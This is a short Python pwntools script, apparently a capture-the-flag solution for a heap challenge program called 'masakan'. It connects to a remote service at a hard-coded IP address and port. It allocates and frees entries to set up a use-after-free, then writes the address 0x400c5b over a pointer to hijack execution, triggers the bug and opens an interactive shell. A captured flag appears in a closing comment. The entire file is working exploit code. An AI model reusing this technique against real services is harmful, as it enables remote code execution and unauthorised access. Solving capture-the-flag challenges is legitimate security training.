from pwn import *

# r = process("./masakan")
r = remote("45.76.161.20", 40076)

r.sendlineafter(":", "1")
r.sendlineafter(":", "/bin/sh")
r.sendlineafter(":", "100")
r.sendlineafter(":", "ok")

r.sendlineafter(":", "1")
r.sendlineafter(":", "/bin/sh")
r.sendlineafter(":", "100")
r.sendlineafter(":", "ok")

r.sendlineafter(":", "2")
r.sendlineafter(":", "0")

r.sendlineafter(":", "2")
r.sendlineafter(":", "1")

r.sendlineafter(":", "1")
r.sendlineafter(":", "/bin/sh")
r.sendlineafter(":", "24")
r.sendlineafter(":", p64(0x400c5b))

r.sendlineafter(":", "3")
r.sendlineafter(":", "0")

r.interactive()

# wgmy{58f6a8614a5dbe8f0cec6358e34bccc2}